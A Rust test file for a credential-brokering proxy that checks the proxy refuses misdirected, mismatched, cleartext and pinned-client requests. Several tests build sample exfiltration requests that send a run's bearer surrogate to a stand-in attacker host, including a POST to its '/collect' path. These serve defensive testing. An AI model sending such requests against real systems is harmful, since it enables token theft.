//! Where a request says it is going: a surrogate sent anywhere but its
//! provider's host, a destination stated three ways that do not agree, a
//! client that will not trust the run CA, and plain HTTP. One test per attack.

mod support;

use opensesame_invoke_through::{Refusal, RefusalCode};
use support::any_cert::accept_any_certificate;
use support::client::{
    bearer, connect, proxy_authorization, raw_request, request, run_trust, send, through_proxy, tls,
};
use support::stub::client_trusting;
use support::{harness, EVIL, HOST};

#[tokio::test]
async fn a_surrogate_sent_to_a_second_host_is_refused_and_reported_misdirected() {
    let h = harness().await;
    let run = h.start("run-exfil");
    let surrogate = run.surrogates()[0].1.as_str().to_owned();
    let seen = through_proxy(
        &run,
        EVIL,
        request(
            "POST",
            EVIL,
            "/collect",
            &[("authorization", &bearer(&run))],
        ),
    )
    .await
    .expect("the proxy terminates any host, so it can see the theft");
    assert_eq!(seen.status, 403);
    assert_eq!(seen.body, Refusal::CLIENT_MESSAGE);
    let refusals = h.refusals.0.lock().unwrap().clone();
    assert_eq!(refusals.len(), 1);
    assert_eq!(refusals[0].code, RefusalCode::Misdirected);
    assert_eq!(refusals[0].code.as_str(), "surrogate.misdirected");
    assert_eq!(refusals[0].run_id.as_deref(), Some("run-exfil"));
    assert_eq!(refusals[0].provider_id.as_deref(), Some("github"));
    assert_eq!(refusals[0].detail.as_deref(), Some(EVIL));
    assert!(!format!("{refusals:?}").contains(&surrogate));
    assert!(h.upstream.hits().is_empty());
    assert_eq!(
        h.source_calls(),
        0,
        "a refused request never touches the credential"
    );
}

#[tokio::test]
async fn a_server_name_that_disagrees_with_connect_is_refused_before_any_certificate() {
    let h = harness().await;
    let run = h.start("run-sni");
    let auth = proxy_authorization(&run);
    let (status, stream) = connect(run.proxy_addr(), &format!("{HOST}:443"), Some(&auth)).await;
    assert_eq!(status, 200);
    // The client would accept any certificate: only the proxy's own check
    // can stop this handshake.
    let handshake = tls(stream, accept_any_certificate(), EVIL).await;
    assert!(
        handshake.is_err(),
        "CONNECT {HOST} with SNI {EVIL} must not complete"
    );
    assert!(h.upstream.hits().is_empty());
    assert_eq!(h.source_calls(), 0);
}

#[tokio::test]
async fn a_host_header_that_disagrees_with_connect_is_refused() {
    let h = harness().await;
    let run = h.start("run-host");
    let auth = proxy_authorization(&run);
    let (status, stream) = connect(run.proxy_addr(), &format!("{HOST}:443"), Some(&auth)).await;
    assert_eq!(status, 200);
    let tunnel = tls(stream, run_trust(&run), HOST).await.expect("handshake");
    let seen = send(
        tunnel,
        request("GET", EVIL, "/user", &[("authorization", &bearer(&run))]),
    )
    .await
    .expect("answered");
    assert_eq!(seen.status, 403);
    assert_eq!(seen.body, Refusal::CLIENT_MESSAGE);
    assert!(h.upstream.hits().is_empty());
    assert_eq!(h.source_calls(), 0);
}

#[tokio::test]
async fn an_absolute_target_naming_another_host_inside_the_tunnel_is_refused() {
    let h = harness().await;
    let run = h.start("run-absolute");
    let auth = proxy_authorization(&run);
    let (_, stream) = connect(run.proxy_addr(), &format!("{HOST}:443"), Some(&auth)).await;
    let tunnel = tls(stream, run_trust(&run), HOST).await.expect("handshake");
    let seen = send(
        tunnel,
        request(
            "GET",
            HOST,
            &format!("https://{EVIL}/user"),
            &[("authorization", &bearer(&run))],
        ),
    )
    .await
    .expect("answered");
    assert_eq!(seen.status, 403);
    assert!(h.upstream.hits().is_empty());
}

#[tokio::test]
async fn a_header_that_is_not_utf8_keeps_a_request_from_being_brokered() {
    let h = harness().await;
    let run = h.start("run-bytes");
    let mut req = request("GET", HOST, "/user", &[("authorization", &bearer(&run))]);
    // A lossy copy is what the scan reads; it must never be what travels.
    req.headers_mut().insert(
        "accept",
        hyper::header::HeaderValue::from_bytes(b"application/\xffjson").unwrap(),
    );
    let seen = through_proxy(&run, HOST, req).await.expect("answered");
    assert_eq!(seen.status, 400);
    assert!(h.upstream.hits().is_empty());
    assert_eq!(h.source_calls(), 0);
}

#[tokio::test]
async fn a_pinning_client_fails_closed() {
    let h = harness().await;
    let run = h.start("run-pinned");
    let auth = proxy_authorization(&run);
    let (status, stream) = connect(run.proxy_addr(), &format!("{HOST}:443"), Some(&auth)).await;
    assert_eq!(status, 200);
    // A client pinned to the provider's real CA, ignoring the run's trust
    // variables: it rejects the run leaf and gets nothing in its place.
    let pinned = client_trusting(&h.upstream.ca.ca_der());
    assert!(tls(stream, pinned, HOST).await.is_err());
    assert!(h.upstream.hits().is_empty());
    assert_eq!(h.source_calls(), 0, "no fallback credential, ever");
    assert!(h.refusals.codes().is_empty());
}

#[tokio::test]
async fn an_h2_only_client_fails_closed() {
    let h = harness().await;
    let run = h.start("run-h2");
    let auth = proxy_authorization(&run);
    let (_, stream) = connect(run.proxy_addr(), &format!("{HOST}:443"), Some(&auth)).await;
    let mut config = run_trust(&run);
    config.alpn_protocols = vec![b"h2".to_vec()];
    let connector = tokio_rustls::TlsConnector::from(std::sync::Arc::new(config));
    let name = rustls::pki_types::ServerName::try_from(HOST).unwrap();
    assert!(connector.connect(name, stream).await.is_err());
    assert!(h.upstream.hits().is_empty());
}

#[tokio::test]
async fn a_surrogate_over_plain_http_trips_cleartext_and_is_never_forwarded() {
    let h = harness().await;
    let run = h.start("run-cleartext");
    let head = format!(
        "GET http://{HOST}/user HTTP/1.1\r\nHost: {HOST}\r\nProxy-Authorization: {}\r\nAuthorization: {}\r\n\r\n",
        proxy_authorization(&run),
        bearer(&run),
    );
    let (status, _) = raw_request(run.proxy_addr(), &head).await;
    assert_eq!(status, 403);
    assert_eq!(h.refusals.codes(), vec![RefusalCode::Cleartext]);
    assert!(h.upstream.hits().is_empty());
    assert_eq!(h.source_calls(), 0);
}

#[tokio::test]
async fn plain_http_without_a_surrogate_is_refused_too() {
    let h = harness().await;
    let run = h.start("run-plain");
    let head = format!(
        "GET http://{HOST}/user HTTP/1.1\r\nHost: {HOST}\r\nProxy-Authorization: {}\r\n\r\n",
        proxy_authorization(&run),
    );
    let (status, _) = raw_request(run.proxy_addr(), &head).await;
    assert_eq!(status, 403, "there is no plaintext egress");
    assert!(h.refusals.codes().is_empty());
    let origin_form = format!(
        "GET /user HTTP/1.1\r\nHost: {HOST}\r\nProxy-Authorization: {}\r\n\r\n",
        proxy_authorization(&run),
    );
    let (status, _) = raw_request(run.proxy_addr(), &origin_form).await;
    assert_eq!(status, 400, "the proxy is not an origin");
}
